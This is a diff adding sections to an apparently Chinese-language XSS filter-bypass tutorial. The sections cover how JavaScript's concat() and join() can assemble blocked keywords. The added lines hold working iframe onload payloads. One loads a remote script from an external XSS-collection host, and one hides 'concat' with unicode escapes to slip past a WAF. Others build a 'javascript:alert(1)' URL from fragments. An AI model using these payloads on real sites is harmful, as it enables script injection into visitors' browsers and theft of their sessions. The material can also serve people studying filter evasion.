@@ -166,7 +166,7 @@
   
   ```
   
-  ### concat
+  ### concat()
   - - -
   
   `concat方法`在实际应用中，不仅仅可以用于连接两个或多个数组，还可以合并两个或者多个字符串。
@@ -185,4 +185,34 @@
   ```
   
   ![21](https://ws1.sinaimg.cn/large/005DAKuvgy1g1v9hzwbnbj30uj09gmxy.jpg)
+  
+  假设concat没被过滤，可以用来干扰waf判断
+  
+  ```html
+  <iframe onload=s=createElement('script');body.appendChild(s);s.src='http://x'.concat('ss.tf/','eeW'); >
+  ```
+  
+  ![22](https://ws1.sinaimg.cn/large/005DAKuvgy1g1va0g7u73j30uj0ai0u2.jpg)
+  
+  
+  如果concat被拦截，可以尝试编码
+  
+  ```html
+  <iframe onload=s=createElement('script');body.appendChild(s);s.src='http://x'.\u0063oncat('ss.tf/','eeW'); >
+  ```
+  
+  ### join()
+  - - -
+  join函数将数组转换成字符串
+  
+  ![23](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vbb5zfrdj30ck05t3yh.jpg)
+  
+  那么我们可以将一些关键字作为数组，再用join连接，转化成字符串。
+  
+  ```html
+  <iframe onload=location=['javascript:alert(1)'].join('')>
+  <iframe onload=location=['java','script:','alert(1)'].join('')>
+  ```
+  
+  ![24](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vbelprdpj30uj09gaav.jpg)
   
